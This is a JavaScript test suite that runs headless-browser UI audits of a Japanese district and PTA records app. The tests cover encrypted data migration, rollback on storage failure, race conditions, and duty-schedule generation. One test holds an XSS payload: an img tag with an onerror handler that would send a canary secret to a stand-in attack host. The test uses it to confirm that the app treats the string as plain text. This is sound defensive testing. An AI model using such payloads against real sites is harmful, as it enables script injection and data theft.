const test = require('node:test');
const assert = require('node:assert/strict');
const { runInHeadlessChrome } = require('./helpers/headless-runner');

function prepareAudit() {
	window.audit = {
		password: 'AuditHandoff123!', pending: {}, counts: {},
		models: () => JSON.stringify([currentDistrict, repState, neighborState, transferState]),
		stored: () => JSON.stringify(Object.fromEntries(Object.keys(localStorage).sort().map(key => [key, localStorage.getItem(key)]))),
		async action(name, selector = `[data-click="${name}"]`) {
			const previous = this.pending[name];
			await ui.click(selector);
			await ui.waitFor(() => this.pending[name] && this.pending[name] !== previous, `${name} dispatched`);
			return await this.pending[name];
		},
		async open() {
			if (!ui.element('#browser-handoff-dialog').open) await ui.click('header [data-click="openBrowserHandoff"]');
		},
		async create() {
			await this.open();
			ui.fill('#handoff-create-pass', this.password);
			ui.fill('#handoff-confirm-pass', this.password);
			assert.strictEqual(await this.action('createBrowserHandoff'), true, 'The actual create Promise succeeds');
			assert.ok(!ui.element('[data-click="createBrowserHandoff"]').disabled, 'Create is ready again');
			return ui.element('#handoff-output').value;
		},
		async paste(text) {
			await this.open();
			ui.fill('#handoff-input', text);
			ui.fill('#handoff-restore-pass', this.password);
			return await this.action('restoreBrowserHandoff');
		},
		async flush() {
			const results = await Promise.all([saveDistrictLocal(), saveRepLocal(), saveNeighborLocal(), saveTransferLocal()]);
			assert.ok(results.every(result => result !== false), 'Fixture autosaves finish before the rejection snapshot');
		},
		async encrypt() {
			await ui.click('#storage-security-badge');
			ui.fill('#modal-set-pass', 'AuditDestination123!');
			ui.fill('#modal-set-pass-confirm', 'AuditDestination123!');
			await ui.click('#modal-btn-enable-enc');
			await ui.waitFor(() => !ui.visible('#storage-settings-modal') && isStorageEncrypted() && isStorageUnlocked(), 'Destination encryption finishes');
		}
	};
	for (const name of ['createBrowserHandoff', 'restoreBrowserHandoff', 'exportDistrictTxt']) {
		const original = window[name];
		window[name] = (...args) => {
			audit.counts[name] = (audit.counts[name] || 0) + 1;
			const task = original(...args);
			audit.pending[name] = task;
			return task;
		};
	}
}

function auditTest(name, run, options = {}) {
	test(name, async () => {
		const out = await runInHeadlessChrome(run, { prepare: prepareAudit, ...options });
		assert.equal(out.success, true, JSON.stringify({ fatal: out.fatal, failures: out.results.filter(result => !result.passed) }));
		assert.deepEqual(out.errors, []);
		assert.ok(out.results.length > 0);
		if (options.observeNetwork) {
			assert.ok(out.requests.some(request => request.url.includes('handoff-observer=positive')), 'Network observer sees a positive control');
			assert.ok(!JSON.stringify(out.requests).includes('AUDIT_HANDOFF_PRIVATE_84217'), 'No private canary in observed URL, headers or body');
			assert.ok(!out.requests.some(request => request.url.includes('handoff-leak.invalid')), 'No attack destination request');
		}
	});
}

auditTest('UI audit handoff: encrypted destination preserves its key and restores every mode after restart', async () => {
	await ui.expand('district');
	ui.fill('#d-name', '移動元地区'); ui.fill('#hata-members', '移動元の当番');
	ui.fill('#d-pass', 'NeverTransfer123!');
	await ui.mode('rep'); await ui.expand('rep');
	ui.fill('#sz-external-tbody [data-field="lastName"]', '移動元校長');
	await ui.mode('neighbor'); await ui.expand('neighbor'); ui.fill('#neighbor-district-name', '移動元自治会');
	await ui.mode('transfer'); ui.fill('#transfer-children-container [data-field="lastName"]', '移動元の途中');
	const text = await audit.create();
	const decoded = JSON.parse(await decryptPayload(text, audit.password));
	assert.ok(!JSON.stringify(decoded).includes('NeverTransfer123!'), 'Submission password is not in the migration payload');
	await ui.click('[data-click="clearBrowserHandoff"]');
	await ui.mode('district'); await ui.expand('district'); ui.fill('#d-name', '移動先の既存地区');
	await audit.encrypt();
	const metadata = localStorage.getItem('kogai_auth_meta');
	assert.strictEqual(await audit.paste(text), true, 'Encrypted destination restore completes');
	assert.strictEqual(localStorage.getItem('kogai_auth_meta'), metadata, 'Destination key wrapping and biometric metadata are unchanged');
	for (const mode of ['district', 'rep', 'neighbor', 'transfer']) {
		const raw = localStorage.getItem(`kogai_${mode}_v2`);
		assert.ok(raw.startsWith('STORAGE_ENC:2:') && !raw.includes('移動元'), 'Every destination model remains encrypted');
	}
	assert.strictEqual(currentDistrict.district, '移動元地区', 'District restored');
	assert.strictEqual(repState.szExternals[0].lastName, '移動元校長', 'Representative restored');
	assert.strictEqual(neighborState.district, '移動元自治会', 'Neighbor restored');
	assert.strictEqual(transferState.children[0].lastName, '移動元の途中', 'Incomplete transfer restored');
	assert.strictEqual(ui.element('#d-pass').value, '', 'Old submission password is cleared');
}, { allowFileAccess: true, afterReload: async () => {
	await ui.waitFor(() => ui.visible('#storage-lock-modal'), 'Destination restart begins locked');
	ui.fill('#modal-unlock-pass', 'AuditDestination123!');
	await ui.click('[data-click="handlePasswordUnlock"]');
	await ui.waitFor(() => !ui.visible('#storage-lock-modal') && currentDistrict.district === '移動元地区', 'Destination password unlocks migrated data');
	assert.strictEqual(repState.szExternals[0].lastName, '移動元校長', 'Representative survives encrypted restart');
	assert.strictEqual(neighborState.district, '移動元自治会', 'Neighbor survives encrypted restart');
	assert.strictEqual(transferState.children[0].firstName, '', 'Incomplete field stays empty after encrypted restart');
	assert.strictEqual(currentDistrict.hata.members, '移動元の当番', 'Flag roster survives encrypted restart');
} });

for (const encrypted of [false, true]) {
	auditTest(`UI audit handoff: ${encrypted ? 'encrypted' : 'plain'} quota failure preserves all stored values, models and DOM`, async () => {
		await ui.expand('district'); ui.fill('#d-name', '復元データ');
		const text = await audit.create();
		await ui.click('[data-click="clearBrowserHandoff"]');
		ui.fill('#d-name', '保持する地区');
		if (window.__encryptedAudit) await audit.encrypt();
		await audit.flush();
		await audit.open();
		ui.fill('#handoff-input', text); ui.fill('#handoff-restore-pass', audit.password);
		const models = audit.models(); const stored = audit.stored();
		const setItem = Storage.prototype.setItem;
		let writes = 0;
		Storage.prototype.setItem = function(key, value) {
			if (key.startsWith('kogai_') && key.endsWith('_v2') && ++writes === 3) throw new DOMException('audit quota', 'QuotaExceededError');
			return setItem.call(this, key, value);
		};
		try {
			assert.strictEqual(await audit.action('restoreBrowserHandoff'), false, 'Write failure reaches the actual restore Promise');
			assert.strictEqual(audit.models(), models, 'No partial model is committed');
			assert.ok(audit.stored() === stored, 'Every raw saved value is rolled back');
			assert.strictEqual(ui.element('#d-name').value, '保持する地区', 'Original form remains unchanged');
			assert.ok(ui.element('#browser-handoff-dialog').open && ui.element('#handoff-status').textContent.includes('失敗'), 'Failure remains visible in the open dialog');
			assert.ok(!ui.element('[data-click="restoreBrowserHandoff"]').disabled, 'Failure re-enables retry');
		} finally { Storage.prototype.setItem = setItem; }
		assert.strictEqual(await audit.action('restoreBrowserHandoff'), true, 'Retry with the same data succeeds');
		assert.strictEqual(currentDistrict.district, '復元データ', 'Retry restores the intended record');
	}, { beforeLoad: new Function(`window.__encryptedAudit = ${encrypted};`) });
}

auditTest('UI audit handoff: file selection wins over paste, oversized input is rejected and selection can be cleared', async () => {
	await ui.expand('district'); ui.fill('#d-name', 'ファイルの地区');
	const fileText = await audit.create();
	await ui.click('[data-click="clearBrowserHandoff"]');
	ui.fill('#d-name', '貼付の地区');
	const pasteText = await audit.create();
	await ui.click('[data-click="clearBrowserHandoff"]');
	ui.fill('#d-name', '維持する地区');
	await audit.flush();
	await audit.open(); ui.fill('#handoff-input', pasteText); ui.fill('#handoff-restore-pass', audit.password);
	await ui.file('#handoff-file', 'x'.repeat(8 * 1024 * 1024 + 1), 'oversized.txt');
	const before = audit.models(); const stored = audit.stored();
	assert.strictEqual(await audit.action('restoreBrowserHandoff'), false, 'Oversized selected file is rejected instead of accepting the pasted data');
	assert.strictEqual(audit.models(), before, 'Oversized selection keeps all models');
	assert.strictEqual(audit.stored(), stored, 'Oversized selection keeps all saved originals');
	await ui.file('#handoff-file', fileText, 'migration.txt');
	assert.strictEqual(await audit.action('restoreBrowserHandoff'), true, 'Valid selected file can retry');
	assert.strictEqual(currentDistrict.district, 'ファイルの地区', 'File has priority over a different valid pasted payload');
	await audit.open(); await ui.file('#handoff-file', 'invalid', 'migration.txt');
	ui.fill('#handoff-input', pasteText); ui.fill('#handoff-restore-pass', audit.password);
	ui.element('#handoff-file').value = '';
	assert.strictEqual(await audit.action('restoreBrowserHandoff'), true, 'Clearing file selection allows pasted data');
	assert.strictEqual(currentDistrict.district, '貼付の地区', 'Paste becomes the selected source');
});

auditTest('UI audit handoff: malformed authenticated payloads preserve all four modes and input drafts', async () => {
	await ui.expand('district'); ui.fill('#d-name', '保持する地区');
	const text = await audit.create();
	const valid = JSON.parse(await decryptPayload(text, audit.password));
	const before = audit.models(); const stored = audit.stored();
	for (const modify of [data => { data.version = 999; }, data => { data.models[2].neighborhood = 'wrong'; }, data => { data.drafts['d-pass'] = 'must-not-restore'; }, data => { data.repDraft = { index: 999 }; }]) {
		const invalid = structuredClone(valid); modify(invalid);
		const ciphertext = await encryptPayload(JSON.stringify(invalid), audit.password);
		assert.strictEqual(await audit.paste(ciphertext), false, 'Authenticated but invalid structure is rejected');
		assert.strictEqual(audit.models(), before, 'Invalid payload does not partially replace a model');
		assert.strictEqual(audit.stored(), stored, 'Invalid payload does not change saved originals');
		assert.strictEqual(ui.element('#d-name').value, '保持する地区', 'Invalid payload does not change the form');
		assert.strictEqual(ui.element('#handoff-input').value, ciphertext, 'Rejected input remains available for correction');
	}
});

for (const operation of ['close', 'lock']) {
	auditTest(`UI audit handoff: ${operation} during decryption prevents late restore and leaves stored originals intact`, async () => {
		await ui.expand('district'); ui.fill('#d-name', '移動元');
		const text = await audit.create(); await ui.click('[data-click="clearBrowserHandoff"]');
		ui.fill('#d-name', '元の保持データ');
		if (window.__restoreOperation === 'lock') await audit.encrypt();
		await audit.flush();
		await audit.open(); ui.fill('#handoff-input', text); ui.fill('#handoff-restore-pass', audit.password);
		const stored = audit.stored();
		const decrypt = window.decryptPayload;
		let release;
		window.decryptPayload = (...args) => new Promise((resolve, reject) => { release = () => decrypt(...args).then(resolve, reject); });
		await ui.click('[data-click="restoreBrowserHandoff"]');
		await ui.waitFor(() => release, 'Actual decrypt is pending');
		const task = audit.pending.restoreBrowserHandoff;
		if (window.__restoreOperation === 'close') await ui.key('Escape');
		else handleImmediateLock();
		release(); await task;
		assert.ok(audit.stored() === stored, 'Late decrypt cannot write any saved model');
		assert.ok(!ui.element('#browser-handoff-dialog').open, 'Late decrypt cannot reopen migration');
		assert.strictEqual(ui.element('#handoff-input').value, '', 'Rejected late data cannot refill input');
		assert.strictEqual(ui.element('#handoff-status').textContent, '', 'Rejected late data cannot update the cleared status');
		if (window.__restoreOperation === 'close') assert.strictEqual(currentDistrict.district, '元の保持データ', 'Closing keeps the original live model');
		else assert.ok(ui.visible('#storage-lock-modal') && !isStorageUnlocked(), 'Lock remains enforced');
	}, { beforeLoad: new Function(`window.__restoreOperation = ${JSON.stringify(operation)};`) });
}

auditTest('UI audit handoff: a late creation cannot overwrite a reopened dialog or consume the newer operation', async () => {
	await audit.open(); ui.fill('#handoff-create-pass', audit.password); ui.fill('#handoff-confirm-pass', audit.password);
	const encrypt = window.encryptPayload;
	let release;
	window.encryptPayload = () => new Promise(resolve => { release = resolve; });
	await ui.click('[data-click="createBrowserHandoff"]');
	await ui.waitFor(() => release, 'First encryption is pending');
	const oldTask = audit.pending.createBrowserHandoff;
	assert.ok(ui.element('[data-click="createBrowserHandoff"]').disabled && ui.element('[data-click="restoreBrowserHandoff"]').disabled, 'Both asynchronous task controls are disabled');
	ui.element('[data-click="createBrowserHandoff"]').click();
	assert.strictEqual(audit.counts.createBrowserHandoff, 1, 'Disabled button cannot dispatch a duplicate operation');
	await ui.click('[data-click="clearBrowserHandoff"]');
	window.encryptPayload = encrypt;
	const text = await audit.create();
	release('ENC:2:stale'); await oldTask;
	assert.strictEqual(ui.element('#handoff-output').value, text, 'Old result cannot replace the new ciphertext');
	assert.ok(ui.element('#browser-handoff-dialog').open && !ui.element('[data-click="createBrowserHandoff"]').disabled, 'New dialog remains usable');
	ui.fill('#handoff-create-pass', audit.password); ui.fill('#handoff-confirm-pass', 'DifferentPass123!');
	assert.strictEqual(await audit.action('createBrowserHandoff'), false, 'Mismatch is reported');
	assert.ok(ui.element('#handoff-result').hidden && ui.element('#handoff-output').value === '', 'A failed recreation cannot leave old export data looking current');
});

auditTest('UI audit handoff: restored new-district draft can be confirmed with Enter', async () => {
	await ui.mode('rep'); await ui.expand('rep');
	await ui.click('[data-click="addNewRepDistrict"]');
	ui.fill('#rep-new-district-name', '入力途中の新地区');
	await ui.click('#rep-add-district-modal [data-click="openBrowserHandoff"]');
	const text = await audit.create();
	assert.strictEqual(repState.districts.length, 0, 'Migration creation does not implicitly add the district');
	assert.strictEqual(await audit.paste(text), true, 'Draft migration restores');
	assert.ok(ui.visible('#rep-add-district-modal'), 'Add-district dialog is reopened');
	assert.strictEqual(ui.element('#rep-new-district-name').value, '入力途中の新地区', 'Unconfirmed district name is restored');
	assert.strictEqual(document.activeElement, ui.element('#rep-new-district-name'), 'Restored draft receives keyboard focus');
	await ui.key('Enter');
	assert.strictEqual(repState.districts[0]?.district, '入力途中の新地区', 'Enter confirms the restored draft');
});

for (const width of [375, 768, 1280]) {
	auditTest(`UI audit handoff: ${width}px native dialog excludes background controls from Tab navigation`, async () => {
		const opener = ui.element('header [data-click="openBrowserHandoff"]');
		await ui.click(opener);
		const dialog = ui.element('#browser-handoff-dialog');
		const rect = dialog.getBoundingClientRect();
		assert.ok(rect.left >= 0 && rect.right <= innerWidth + 1, 'Open dialog fits the viewport horizontally');
		assert.ok(dialog.clientHeight <= innerHeight && dialog.scrollHeight >= dialog.clientHeight, 'Long dialog has a bounded scrollable body');
		for (let index = 0; index < 17; index++) {
			await ui.key('Tab');
			// Chromiumは末尾からの移動でBODYを一度返す。背景の入力へ移らず、次のTabで戻ることを検査する。
			if (document.activeElement === document.body) await ui.key('Tab');
			assert.ok(dialog.contains(document.activeElement), 'Tab never reaches a background control');
		}
		await ui.key('Escape');
		assert.ok(!dialog.open, 'Escape closes the dialog');
		assert.strictEqual(document.activeElement, opener, 'Focus returns to the invoking control');
	}, { viewport: [width, 812] });
}

auditTest('UI audit flag dates: incomplete schedule inputs survive restart without poisoning valid settings', async () => {
	await ui.expand('district'); await ui.click('#card-d-hata summary'); ui.fill('#d-name', '保全地区');
	ui.fill('#hata-start-date', '2026-11-09'); ui.fill('#hata-end-date', '2026-11-15');
	ui.fill('#hata-holidays', ''); ui.fill('#hata-specials', '');
	ui.fill('#hata-end-date', '2050-11-15');
	ui.fill('#hata-holidays', '2026-'); ui.fill('#hata-specials', '2026-11-');
	await audit.flush();
	assert.strictEqual(currentDistrict.hata.endDate, '2026-11-15', 'Invalid interval never replaces the last valid date');
	assert.strictEqual(currentDistrict.hata.inputDrafts.endDate, '2050-11-15', 'Raw end date remains a draft');
	assert.ok(ui.element('#hata-input-status').textContent.includes('未完成'), 'Visible correction guidance');
	const printCount = __prints.length;
	await ui.click('[data-click="runAutoHataGeneration"]');
	await ui.click('[data-click="copyHataForLine"]');
	await ui.click('[data-click="printHataSchedule"]');
	assert.strictEqual(__prints.length, printCount, 'Invalid draft cannot print an older schedule');
	assert.strictEqual(hataCurrentSchedule.length, 0, 'Invalid draft does not expose stale rows');
	ui.captureDownloads(); ui.fill('#d-pass', 'AuditExport123!'); ui.fill('#d-pass-confirm', 'AuditExport123!');
	assert.strictEqual(await audit.action('exportDistrictTxt'), undefined, 'Export Promise completes');
	const cipher = __downloads[0].content.match(/BEGIN_DATA:\n([\s\S]+?)\n:END_DATA/)[1];
	const exported = JSON.parse(await decryptPayload(cipher, 'AuditExport123!'));
	assert.strictEqual(exported.hata.inputDrafts.specials, '2026-11-', 'Encrypted district export preserves unfinished text');
	const handoff = await audit.create();
	assert.strictEqual(await audit.paste(handoff), true, 'Handoff validator accepts separated drafts');
	assert.strictEqual(ui.element('#hata-holidays').value, '2026-', 'Handoff restores incomplete text');
	await audit.flush();
}, { allowFileAccess: true, afterReload: async () => {
	await ui.expand('district');
	assert.strictEqual(ui.element('#d-name').value, '保全地区', 'Other district data survives validation on restart');
	assert.strictEqual(ui.element('#hata-end-date').value, '2050-11-15', 'Raw period restored');
	await ui.click('#card-d-hata summary');
	assert.strictEqual(ui.element('#hata-holidays').value, '2026-', 'Incomplete holiday restored');
	assert.strictEqual(ui.element('#hata-specials').value, '2026-11-', 'Incomplete special restored');
	ui.fill('#hata-end-date', '2026-11-15'); ui.fill('#hata-holidays', '2026-11-10,休日'); ui.fill('#hata-specials', '2026-11-14,特別担当,行事');
	assert.strictEqual(currentDistrict.hata.inputDrafts, undefined, 'Repair commits all fields together and clears drafts');
	await ui.click('[data-click="runAutoHataGeneration"]');
	assert.ok(hataCurrentSchedule.some(row => row.date === '2026-11-14' && row.person === '特別担当'), 'Repaired inputs generate the intended rows');
} });

auditTest('UI audit handoff: saving a restored representative draft preserves surviving seat references', async () => {
	await ui.expand('district'); ui.fill('#d-name', '座席地区');
	ui.fill('#officers-container .officer-item-box:first-child [data-field="lastName"]', '役員A');
	await ui.click('[data-click="addOfficer"]');
	ui.fill('#officers-container .officer-item-box:last-child [data-field="lastName"]', '役員B');
	await ui.mode('rep'); await ui.expand('rep');
	await ui.click('[data-click="addCurrentDistrictToRep"]');
	await ui.waitFor(() => repState.districts[0]?.officers.length === 2, 'Representative original is ready');
	ui.fill('#seat-grid-container .seat-cell-edit:nth-child(1) select', 'OFF_0_1');
	ui.fill('#seat-grid-container .seat-cell-edit:nth-child(2) select', 'OFF_0_0');
	await ui.click('[data-click="openRepDistrictDetailModal"][data-index="0"]');
	await ui.click('#rep-modal-officer-tbody tr:first-child [data-click="removeModalOfficerRow"]');
	await ui.click('#rep-district-detail-modal [data-click="addModalOfficerRow"]');
	ui.fill('#rep-modal-officer-tbody tr:last-child [data-field="lastName"]', '新しい役員');
	await ui.click('#rep-district-detail-modal [data-click="openBrowserHandoff"]');
	const text = await audit.create();
	assert.strictEqual(await audit.paste(text), true, 'Unconfirmed representative draft is restored');
	await ui.waitFor(() => ui.visible('#rep-district-detail-modal') && getModalCurrentDistrict()?.officers[0]?.lastName === '役員B', 'Restored editor targets the intended district and draft');
	await ui.click('[data-click="saveAndCloseRepDistrictDetailModal"]');
	assert.strictEqual(repState.districts[0].officers[0].lastName, '役員B', 'Retained officer is now the first row');
	assert.strictEqual(repState.seatConfig.cells['0_0'].refKey, 'OFF_0_0', 'Seat follows the surviving officer');
	assert.strictEqual(repState.seatConfig.cells['0_1'].refKey, '', 'Removed officer does not give their seat to a new row');
});

auditTest('UI audit flags: weekend selection, imported overrides, holidays, special slots and statistics agree on mobile', async () => {
	await ui.expand('district');
	const config = { title: '土日当番', startDate: '2026-11-07', endDate: '2026-11-15', weekdays: [6, 0],
		members: '当番A\n当番B', holidays: '2026-11-08,休校', specials: '2026-11-14,固定担当,学校行事',
		exemptHouseholds: ['当番B'], layoutColumns: '5', orientation: 'landscape',
		manualOverrides: { '2026-11-15': { person: '交代担当', note: '相談済み', isSwapped: true, originalPerson: '当番A' } } };
	await ui.file('#card-d-hata input[type="file"]', JSON.stringify(config), 'weekend.json');
	await ui.waitFor(() => currentDistrict.hata.title === '土日当番' && ui.element('#card-d-hata input[type="file"]').value === '', 'Official JSON has finished rendering and saving');
	await ui.click('[data-click="runAutoHataGeneration"]');
	assert.strictEqual(hataCurrentSchedule.map(row => row.date).join(','), '2026-11-07,2026-11-08,2026-11-14,2026-11-15', 'Both weekend controls reach the generator');
	assert.strictEqual(hataCurrentSchedule.map(row => row.person).join(','), '当番A,-,固定担当,交代担当', 'Holiday, exemption, special and manual assignment all apply');
	assert.strictEqual(ui.element('#hata-columns').value, '5', 'Five-column imported print setting is reachable');
	assert.ok(ui.element('.hata-card-list').textContent.includes('休校') && ui.element('.hata-card-list').textContent.includes('交代'), 'Mobile cards reflect both holiday reason and exchanged assignment');
	await ui.click('[data-click="toggleHataSummary"]');
	for (const [name, regular, special] of [['当番A', 1, 0], ['当番B', 0, 0], ['固定担当', 0, 1], ['交代担当', 1, 0]]) {
		const card = [...document.querySelectorAll('#hata-summary-container .summary-item')].find(item => item.querySelector('strong').textContent === name);
		assert.ok(card && card.textContent.includes(`通常: ${regular}回`) && card.textContent.includes(`特別: ${special}回`), 'UI statistics match the actual assignment for ' + name);
	}
	await ui.click('[name="hata-weekday"][value="0"]');
	await ui.click('[name="hata-weekday"][value="6"]');
	await ui.click('[data-click="runAutoHataGeneration"]');
	assert.strictEqual(hataCurrentSchedule.map(row => row.date).join(','), '2026-11-14', 'With no weekdays only the explicit special slot remains');
}, { viewport: [375, 812] });

auditTest('UI audit handoff: hostile migrated fields and paste drafts stay text and create no attack requests', async () => {
	await new Promise(resolve => { const img = new Image(); img.onload = img.onerror = resolve; img.src = new URL('icons/icon-192.png?handoff-observer=positive', location.href); });
	const canary = 'AUDIT_HANDOFF_PRIVATE_84217';
	const attack = `<img data-handoff-attack src="https://handoff-leak.invalid/${canary}" onerror="window.__handoffExecuted=1">`;
	await ui.expand('district'); ui.fill('#d-name', attack);
	const text = await audit.create();
	const data = JSON.parse(await decryptPayload(text, audit.password));
	data.drafts['d-paste-box'] = attack;
	const encrypted = await encryptPayload(JSON.stringify(data), audit.password);
	assert.strictEqual(await audit.paste(encrypted), true, 'Authenticated hostile strings are accepted as data');
	assert.strictEqual(ui.element('#d-name').value, attack, 'Migrated district input preserves literal text');
	await ui.click('#btn-load-district-paste');
	assert.strictEqual(ui.element('#d-paste-box').value, attack, 'Pending pasted input is restored literally without automatic import');
	assert.strictEqual(document.querySelectorAll('[data-handoff-attack]').length, 0, 'Migration never constructs attack markup');
	assert.strictEqual(window.__handoffExecuted, undefined, 'Migration never executes imported event handlers');
}, { observeNetwork: true });

auditTest('UI audit flag file save: edits made during export remain dirty until the current snapshot is exported', async () => {
	await ui.expand('district'); ui.fill('#d-name', '地区');
	ui.fill('#hata-title', '出力開始時のタイトル');
	ui.fill('#d-pass', 'AuditExport123!'); ui.fill('#d-pass-confirm', 'AuditExport123!');
	ui.captureDownloads();
	const encrypt = window.encryptPayload;
	let release;
	window.encryptPayload = (...args) => new Promise((resolve, reject) => { release = () => encrypt(...args).then(resolve, reject); });
	await ui.click('#btn-save-district-file');
	await ui.waitFor(() => release, 'Actual district encryption is pending');
	const task = audit.pending.exportDistrictTxt;
	ui.fill('#hata-title', '出力中に追加した変更');
	release(); await task;
	const cipher = __downloads[0].content.match(/BEGIN_DATA:\n([\s\S]+?)\n:END_DATA/)[1];
	assert.strictEqual(JSON.parse(await decryptPayload(cipher, 'AuditExport123!')).hata.title, '出力開始時のタイトル', 'Export contains the captured snapshot');
	assert.ok(ui.element('#hata-save-status').textContent.includes('未保存'), 'Newer edit is still marked unsaved');
	const leaving = new Event('beforeunload', { cancelable: true }); window.dispatchEvent(leaving);
	assert.ok(leaving.defaultPrevented, 'Unsaved edit requests a browser leave confirmation');
	window.encryptPayload = encrypt;
	await audit.action('exportDistrictTxt', '#btn-save-district-file');
	assert.ok(ui.element('#hata-save-status').textContent.includes('保存・読込済み'), 'Current snapshot export clears the unsaved status');
	const saved = new Event('beforeunload', { cancelable: true }); window.dispatchEvent(saved);
	assert.ok(!saved.defaultPrevented, 'Saved flag settings do not request another leave confirmation');
});

auditTest('UI audit flag members: format applies only on explicit reflection and cancellation preserves manual text', async () => {
	await ui.expand('district');
	ui.fill('#students-tbody tr:first-child [data-field="lastName"]', '山田');
	ui.fill('#students-tbody tr:first-child [data-field="firstName"]', '太郎');
	ui.fill('#students-tbody tr:first-child [data-field="address"]', '１番２号');
	ui.fill('#hata-members', '手編集当番');
	ui.fill('#hata-format', '{氏名} ({住所数字})');
	assert.strictEqual(ui.element('#hata-members').value, '手編集当番', 'Changing format alone preserves manual members');
	window.__confirmAnswer = false;
	await ui.click('[data-click="syncHataMembersFromStudents"]');
	assert.strictEqual(currentDistrict.hata.members, '手編集当番', 'Cancel preserves manual members');
	window.__confirmAnswer = true;
	await ui.click('[data-click="syncHataMembersFromStudents"]');
	assert.strictEqual(ui.element('#hata-members').value, '山田 太郎 (1-2)', 'Explicit reflection applies the configured format');
	await ui.click('[data-click="addStudentRow"]');
	ui.fill('#students-tbody tr:last-child [data-field="lastName"]', '山田');
	ui.fill('#students-tbody tr:last-child [data-field="firstName"]', '花子');
	ui.fill('#students-tbody tr:last-child [data-field="address"]', '1-2');
	await ui.click('[data-click="syncHataMembersFromStudents"]');
	assert.strictEqual(ui.element('#hata-members').value, '山田 太郎 (1-2)', 'Same household deduplicates even with fullwidth source address');
	await ui.click('#hata-dedup');
	assert.strictEqual(ui.element('#hata-members').value, '山田 太郎 (1-2)', 'Changing deduplication alone preserves members');
	await ui.click('[data-click="syncHataMembersFromStudents"]');
	assert.strictEqual(ui.element('#hata-members').value, '山田 太郎 (1-2)\n山田 花子 (1-2)', 'Explicit reflection without deduplication keeps both siblings');
	await ui.click('#card-d-hata summary');
	const exemptions = [...document.querySelectorAll('#hata-exempt-list input')];
	assert.strictEqual(exemptions.length, 2, 'Exemption choices use the actual formatted roster');
	await ui.click(exemptions[0]);
	ui.fill('#hata-start-date', '2026-11-09'); ui.fill('#hata-end-date', '2026-11-13'); ui.fill('#hata-holidays', '');
	await ui.click('[data-click="runAutoHataGeneration"]');
	assert.ok(hataCurrentSchedule.every(row => row.person === '山田 花子 (1-2)'), 'Custom-formatted exempt member receives no assignment');
	ui.fill('#hata-members', '外部担当\n別の手入力担当');
	assert.strictEqual([...document.querySelectorAll('#hata-exempt-list label')].map(label => label.textContent.trim()).join(','), '外部担当,別の手入力担当', 'Manual roster edits refresh actual exemption choices');
	await ui.click('#hata-exempt-list input');
	await ui.click('[data-click="runAutoHataGeneration"]');
	assert.ok(hataCurrentSchedule.every(row => row.person === '別の手入力担当'), 'Manually added exempt member receives no assignment');
	assert.strictEqual(document.querySelector('#hata-preview'), null, 'No redundant member preview');
});
